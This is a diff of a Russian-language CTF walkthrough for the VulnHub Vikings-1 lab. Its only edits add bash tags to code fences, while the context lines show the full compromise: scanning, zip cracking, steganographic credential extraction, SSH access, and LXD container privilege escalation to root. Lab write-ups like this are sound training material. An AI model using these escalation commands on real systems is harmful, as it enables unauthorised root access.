@@ -23,7 +23,7 @@ export ip=192.168.56.126 && nmap_ctf $ip
 ```
 
 ### nmap  
-```
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -58,7 +58,7 @@ Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## 🕵️ Enumeration
 
 ### ffuf
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/scans]
 └─$ ffuf -fc 404 -t 100 -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -u http://192.168.56.126/site/FUZZ -ic -c
 
@@ -95,7 +95,7 @@ js                      [Status: 301, Size: 318, Words: 20, Lines: 10, Duration:
 ![war](screenshots/00.war.png)
 
 Закодированный текст - оказался файлом zip
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ curl http://192.168.56.126/site/war-is-over/ | base64 -d > text.txt
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -117,7 +117,7 @@ text.txt: Zip archive data, at least v5.1 to extract, compression method=AES Enc
 ```
 
 Взламываю с помощью `john`
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ zip2john a.zip > hash.txt    
                                                                                                                   
@@ -141,14 +141,14 @@ a.zip/king:ragnarok123:king:a.zip:a.zip
 ```
 
 Распакованный файл оказался изображением
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ file king    
 king: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=14, height=4000, bps=0, PhotometricInterpretation=RGB, description=Viking ships on the water under the sunlight and dark storm. Invasion in the storm. 3D illustration.; Shutterstock ID 100901071, orientation=upper-left, width=6000], baseline, precision 8, 1600x1067, components 3
 ```
 
 Смотрю мета даные
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ exiftool king         
 ExifTool Version Number         : 12.76
@@ -249,7 +249,7 @@ Thumbnail Image                 : (Binary data 5613 bytes, use -b option to extr
 ```
 
 Извлекаю данные с помощью binwalk
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ binwalk -e king
 
@@ -281,7 +281,7 @@ drwxrwxr-x 3 kali kali 4096 Jul 10 08:12 ..
 ## 📂 Получение доступа
 
 Пробую ssh
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/…/VulnHub/Vikings-1/exploits/_king.extracted]
 └─$ ssh FamousBoatbuilder_floki@192.168.56.126       
 The authenticity of host '192.168.56.126 (192.168.56.126)' can't be established.
@@ -325,7 +325,7 @@ floki@vikings:~$
 ```
 
 Загружаю linpeas.sh
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ scp linpeas.sh floki@192.168.56.126:/tmp/                                                          
 floki@192.168.56.126's password: 
@@ -339,14 +339,14 @@ linpeas.sh
 ## ⚙️ Привилегии
 
 Проверяю и настраиваю окружение
-```
+```bash
 floki@vikings:/tmp$ which lxd && which lxc
 /usr/bin/lxd
 /usr/bin/lxc
 ```
 
 При инициализации выбираю `none` для `IPv6`, остальное по умолчанию (`enter`)
-```
+```bash
 floki@vikings:/tmp$ lxd init
 Would you like to use LXD clustering? (yes/no) [default=no]: 
 Do you want to configure a new storage pool? (yes/no) [default=yes]: 
@@ -366,7 +366,7 @@ Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
 ```
 
 Скачиваю готовый образ для эскалации Alpine
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ git clone https://github.com/saghul/lxd-alpine-builder
 Cloning into 'lxd-alpine-builder'...
@@ -379,7 +379,7 @@ Resolving deltas: 100% (19/19), done.
 ```
 
 Загружаю образ на жертву
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Vikings-1/exploits]
 └─$ cd lxd-alpine-builder
                                                                                                                    
@@ -401,13 +401,13 @@ alpine-v3.13-x86_64-20210218_0139.tar.gz                                        
 ```
 
 Импортирую образ
-```
+```bash
 floki@vikings:/tmp$ lxc image import ./alpine*.tar.gz --alias alpine
 Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
 ```
 
 Создаю и запускаю привилегированный контейнер
-```
+```bash
 floki@vikings:/tmp$ lxc init alpine privesc -c security.privileged=true
 Creating privesc
 floki@vikings:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
@@ -419,14 +419,14 @@ uid=0(root) gid=0(root)
 ```
 
 Далее получаю root на хосте
-```
+```bash
 ~ # chroot /mnt/root bash
 root@privesc:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Читаю флаги
-```
+```bash
 root@privesc:/# cd /root
 root@privesc:~# ls -la
 total 48
